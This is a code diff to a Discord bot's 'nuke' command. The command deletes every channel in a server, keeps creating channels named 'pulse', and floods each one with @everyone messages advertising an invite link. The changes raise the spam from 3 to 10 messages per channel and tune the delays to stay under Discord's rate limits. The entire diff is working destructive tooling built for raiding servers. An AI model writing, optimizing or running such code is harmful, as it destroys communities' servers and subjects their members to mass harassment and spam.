@@ -150,11 +150,10 @@ client.on('interactionCreate', async (interaction) => {
             ];
             const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;
 
-            // ---- DELETE ALL CHANNELS (with slight delay to avoid rate limit) ----
+            // ---- DELETE ALL CHANNELS ----
             const channels = guild.channels.cache;
             console.log(`Deleting ${channels.size} channels...`);
             
-            // Delete in batches of 5 with delay
             const channelArray = Array.from(channels.values());
             for (let i = 0; i < channelArray.length; i += 5) {
                 const batch = channelArray.slice(i, i + 5);
@@ -167,14 +166,37 @@ client.on('interactionCreate', async (interaction) => {
             }
             console.log('All channels deleted.');
 
-            // ---- CREATE "pulse" CHANNELS AT OPTIMIZED SPEED ----
-            console.log('Creating "pulse" channels...');
+            // ---- FUNCTION TO SPAM A CHANNEL HEAVILY ----
+            async function spamChannelHeavy(ch) {
+                if (!nukeRunning) return;
+                try {
+                    // Send 10 messages instantly
+                    for (let i = 0; i < 10; i++) {
+                        if (!nukeRunning) break;
+                        try {
+                            const line = variants[Math.floor(Math.random() * variants.length)];
+                            let big = `@everyone ${line}\n`;
+                            while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
+                                big += line + '\n';
+                            }
+                            big += `\n${inviteLine}`;
+                            const spamMessage = big.slice(0, 2000);
+                            await ch.send(spamMessage);
+                        } catch(e) {}
+                        // Small delay between messages in same channel to avoid rate limit
+                        await new Promise(r => setTimeout(r, 50));
+                    }
+                } catch(e) {}
+            }
+
+            // ---- CREATE "pulse" CHANNELS WITH HEAVY SPAM ----
+            console.log('Creating "pulse" channels with heavy spam...');
             
-            // Create initial 50 channels in batches
-            for (let i = 0; i < 50; i += 5) {
+            // Create initial 50 channels with heavy spam
+            for (let i = 0; i < 50; i += 3) {
                 if (!nukeRunning) break;
                 const batch = [];
-                for (let j = 0; j < 5; j++) {
+                for (let j = 0; j < 3; j++) {
                     batch.push('pulse');
                 }
                 const results = await Promise.all(batch.map(async (name) => {
@@ -188,27 +210,18 @@ client.on('interactionCreate', async (interaction) => {
                     }
                 }));
                 
-                // Spam the newly created channels
                 const validChannels = results.filter(c => c !== null);
                 if (validChannels.length > 0) {
-                    await Promise.all(validChannels.map(async (ch) => {
-                        try {
-                            const line = variants[Math.floor(Math.random() * variants.length)];
-                            let big = `@everyone ${line}\n`;
-                            while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
-                                big += line + '\n';
-                            }
-                            big += `\n${inviteLine}`;
-                            const spamMessage = big.slice(0, 2000);
-                            await ch.send(spamMessage);
-                        } catch(e) {}
-                    }));
+                    // Heavy spam each channel
+                    for (const ch of validChannels) {
+                        await spamChannelHeavy(ch);
+                    }
                 }
                 await new Promise(r => setTimeout(r, 200));
             }
 
-            // ---- CONTINUOUS CHANNEL CREATION + SPAM (OPTIMIZED) ----
-            async function createAndSpam() {
+            // ---- CONTINUOUS CHANNEL CREATION + HEAVY SPAM ----
+            async function createAndSpamHeavy() {
                 let createdCount = 0;
                 while (nukeRunning) {
                     try {
@@ -221,9 +234,10 @@ client.on('interactionCreate', async (interaction) => {
                         
                         const valid = newChannels.filter(c => c !== null);
                         
-                        // Send 3 spam messages to each new channel (not too many)
+                        // HEAVY SPAM - 10 messages per channel
                         for (const ch of valid) {
-                            for (let i = 0; i < 3; i++) {
+                            for (let i = 0; i < 10; i++) {
+                                if (!nukeRunning) break;
                                 try {
                                     const line = variants[Math.floor(Math.random() * variants.length)];
                                     let big = `@everyone ${line}\n`;
@@ -234,23 +248,23 @@ client.on('interactionCreate', async (interaction) => {
                                     const spamMessage = big.slice(0, 2000);
                                     await ch.send(spamMessage);
                                 } catch(e) {}
+                                await new Promise(r => setTimeout(r, 50));
                             }
                         }
                         
                         createdCount += valid.length;
-                        console.log(`Created ${createdCount} channels total`);
+                        console.log(`Created ${createdCount} channels total, spammed each with 10 messages`);
                         
                     } catch(e) {}
                     
-                    // Wait 500ms between cycles to avoid rate limits
                     await new Promise(r => setTimeout(r, 500));
                 }
             }
 
-            // Start continuous creation
-            createAndSpam();
+            // Start continuous creation with heavy spam
+            createAndSpamHeavy();
 
-            await interaction.editReply('✅ **OPTIMIZED NUKE RUNNING!** Creating "pulse" channels and spamming at optimal speed. Rate limit safe.');
+            await interaction.editReply('✅ **OPTIMIZED NUKE RUNNING!** Creating "pulse" channels and spamming 10 messages per channel. Rate limit optimized.');
             return;
         }
 
